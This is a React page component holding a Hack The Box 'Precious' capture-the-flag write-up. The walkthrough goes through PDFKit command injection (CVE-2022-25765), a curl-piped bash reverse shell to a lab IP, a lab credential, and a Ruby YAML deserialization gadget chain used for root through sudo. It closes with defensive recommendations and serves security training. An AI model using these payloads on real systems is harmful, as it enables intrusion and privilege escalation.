import React from 'react';

// Import placeholder images - replace with actual screenshots
import preciousLogo from "../../assets/precious/logo.png"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/precious/nmap-scan.png"
import webInterface from "../../assets/precious/webpage.png"
import httpServer from "../../assets/precious/reached.png"
import pdfConvert from "../../assets/precious/converted.png"
import ssrfError from "../../assets/precious/error.png"
import burpRequest from "../../assets/precious/post.png"
import exiftool from "../../assets/precious/exif.png"
import exploitCode from "../../assets/precious/exp.png"
import urlEncode from "../../assets/precious/all-encoded.png"
import curlTest from "../../assets/precious/proof.png"
import reverseShell from "../../assets/precious/ruby.png"

import bundleConfig from "../../assets/precious/bundle.png"
import etcPasswd from "../../assets/precious/etc-passwd.png"
import sshHenry from "../../assets/precious/henry.png"

import sudoList from "../../assets/precious/sudo-l.png"
import updateDependencies from "../../assets/precious/cat-bin.png"
import rootShell from "../../assets/precious/root.png"


const Precious = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">22/07/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Precious</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Dive into Precious, a challenging box that demonstrates critical vulnerabilities in web applications. Master URL input command injection through PDFKit exploitation, navigate through Ruby YAML deserialization attacks, and escalate privileges via misconfigured sudo permissions. This box showcases how seemingly harmless PDF conversion services can become gateways to complete system compromise!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["URL input", "command injection", "PDFKit CVE-2022-25765", "YAML deserialization", "ruby exploitation", "credential discovery", "sudo misconfiguration", "lateral movement"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={preciousLogo} alt="precious landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Precious HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('lateral-movement')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Lateral Movement
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('lateral-movement');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Lateral Movement
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.189
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Upon visiting the website we see an input field expecting a <span className="text-blue-400">URL</span>.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.189 precious.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://precious.htb
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={webInterface} alt="web interface" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can test out it's functionality by trying it to reach out to us.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server 80
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we can see it reaches out to us and converts the webpage to a <span className="text-yellow-400">PDF file</span>.
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={httpServer} alt="http server response" />
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={pdfConvert} alt="pdf conversion" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Firstly this could open up vulnerability to <span className="text-red-400 font-semibold">SSRF</span> so let's test it out and search for internal services
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            http://127.0.0.1
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={ssrfError} alt="ssrf error" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It throws an <span className="text-orange-400">error</span> saying external URLs only so it's not vulnerable. Moving on we need more enumeration information for a possible attack vector so let's see how it converts the URL into a pdf. So let's see the request in <span className="text-blue-400">burp</span> and examine the <span className="text-yellow-400">pdf</span> file
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={burpRequest} alt="burp request" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It sends a POST request to the <span className="text-yellow-400">/</span> path with <span className="text-red-400">url</span> parameter that gives us a window for possible <span className="text-red-400 font-semibold">command injection</span>, but before we test this vector I want to know more about the tool and conversion itself to gather ideas how to include <span className="text-orange-400">RCE</span> payload or if it's even possible. So I downloaded the pdf file to my machine and ran:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            exiftool [PDF]
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={exiftool} alt="exiftool output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We got the tool and the version. Quick google search shows <span className="text-red-400 font-semibold">CVE-2022-25765</span> PDFkit-CMD-Injection: <span className="text-blue-400">https://www.exploit-db.com/exploits/51293</span>
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Downloading the exploit and running will work because the parameter is in-fact correct
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={exploitCode} alt="exploit code" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        But looking at the exploit it seems to be pretty simple that can be done manual just for the sake of learning. So if we look at the exploit we can see that it puts this payload within the URL POST parameter
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            http://%20`ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{`{str(listenIP)}`}\",\...
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Also this payload goes into a <span className="text-yellow-400">quote(payload, safe="")</span> which is a function for URL encoding with safe being no character will be considered safe
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So it seems the server side filter only looks at the <span className="text-red-400">http://</span> to be included then with a space - <span className="text-yellow-400">%20</span> it will execute the lines after between <span className="text-blue-400">``</span>. Let's try this out in burp
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's mess with the param and make it reach out to us with a curl system command to test out even from a blind RCE. Using this payload:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            url=http://%20`ruby -e'system("curl http://10.10.14.11")'`
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        then encoding ALL characters
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={urlEncode} alt="url encoding" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And it works !!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={curlTest} alt="curl test success" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So from this server host a bash reverse shell payload and execute it with a <span className="text-red-400">pipe</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`nano bash_1.sh

#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.11/9443; bash <&196 >&196 2>&196`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then start listening and run this payload
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 9443
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            url=http://%20`ruby -e'system("curl http://10.10.14.11/bash_1.sh|bash")'`
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Make sure <span className="text-red-400">ALL</span> URL encode it
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a shell as <span className="text-yellow-400">ruby</span> !!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Before we move on upgrade our shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On your attacking machine:
stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="lateral-movement" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Lateral Movement</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Looking around files in <span className="text-yellow-400">ruby's</span> home directory we can find an interesting hidden file in the <span className="text-blue-400">.bundle</span> folder
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /home/ruby
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            find . -type f
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Looking at the file we got credentials for the user <span className="text-yellow-400">henry</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={bundleConfig} alt="bundle config" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            henry:Q3c1AqGHtoI0aXAYFH
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that there is a home folder for henry and he is also present in <span className="text-yellow-400">/etc/passwd</span> so let's try ssh into henry
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={etcPasswd} alt="etc passwd" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh henry@precious.htb
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got in as <span className="text-yellow-400">henry</span> !!!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sshHenry} alt="ssh henry" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Privilege Escalation</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Running my usual manual enumeration got me to an interesting vector which is that we are allowed to run <span className="text-red-400">/usr/bin/ruby /opt/update_dependencies.rb</span> with <span className="text-yellow-400">sudo</span> as <span className="text-red-400">root</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo -l
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sudoList} alt="sudo privileges" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        When running it it shows an error saying no file such as <span className="text-orange-400">dependencies.yml</span> this screams it checks for this file within my working directory, which could allow me to include my own file as a payload. But to make sure lets look at the binary
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={updateDependencies} alt="update dependencies script" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Okay now we can be pretty confident this vector is in-fact vulnerable due to the:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            YAML.load(File.read(""))
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Googling this function shows as that loading <span className="text-yellow-400">.yml</span> file this way will execute the command injected into the <span className="text-red-400">git_set</span> variable.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And also we know that we can serve our <span className="text-yellow-400">.yml</span> file as it looks at our current working directory where the binary is executed
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Looking around I found this payload from: <span className="text-blue-400">https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
        socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
                socket: !ruby/module 'Kernel'
                method_id: :system
            git_set: id
        method_id: :resolve`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So if we make a <span className="text-yellow-400">dependencies.yml</span> file with this content we could execute the system command <span className="text-red-400">id</span> as <span className="text-red-400">root</span>. I've changed the payload to <span className="text-yellow-400">/bin/bash</span> to get a root shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ...EVERYTHING THE SAME.....
                            <div></div>
                            git_set: /bin/bash
                        </code>
                    </div>
                    
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nano dependencies.yml
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            [CNTR + V]
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After successfully creating the payload. We can run
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo /usr/bin/ruby /opt/update_dependencies.rb
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        From the same directory where we created the <span className="text-yellow-400">.yml</span> payload
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we successfully got a <span className="text-red-400 font-semibold">root shell</span> !!!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">PDFKit Vulnerability:</span> CVE-2022-25765 demonstrates how PDF generation libraries can be exploited through command injection</li>
                            <li>• <span className="text-blue-400">URL Parameter Manipulation:</span> Understanding URL encoding and payload construction is crucial for exploiting web vulnerabilities</li>
                            <li>• <span className="text-yellow-400">Blind Command Injection:</span> Testing with outbound connections helps identify blind RCE vulnerabilities</li>
                            <li>• <span className="text-green-400">Ruby Exploitation:</span> Ruby's system calls and command execution can be leveraged for RCE</li>
                            <li>• <span className="text-purple-400">Credential Discovery:</span> Hidden configuration files often contain reusable credentials</li>
                            <li>• <span className="text-orange-400">YAML Deserialization:</span> Insecure YAML loading can lead to arbitrary code execution</li>
                            <li>• <span className="text-cyan-400">Sudo Misconfigurations:</span> Applications that load user-controlled files with elevated privileges are prime targets</li>
                            <li>• <span className="text-pink-400">File Analysis:</span> Tools like exiftool can reveal critical version information for vulnerability research</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">burp suite</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">exiftool</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">ruby</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">netcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">python</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">yaml</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">ssh</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box brilliantly demonstrates the danger of trusting user input in web applications. 
                                The PDFKit vulnerability shows how third-party libraries can introduce critical security flaws. Combined with insecure YAML deserialization 
                                and sudo misconfigurations, this creates a complete attack chain from unauthenticated user to root. The exploitation path highlights 
                                the importance of input validation, secure coding practices, and proper privilege management.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Always validate and sanitize user input before processing, keep third-party libraries updated 
                                and monitor for CVEs, avoid running applications with elevated privileges, implement proper file permission checks, 
                                use secure YAML parsing methods that don't allow code execution, and regularly audit sudo permissions to ensure principle of least privilege.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
        </div>
    )
}

export default Precious;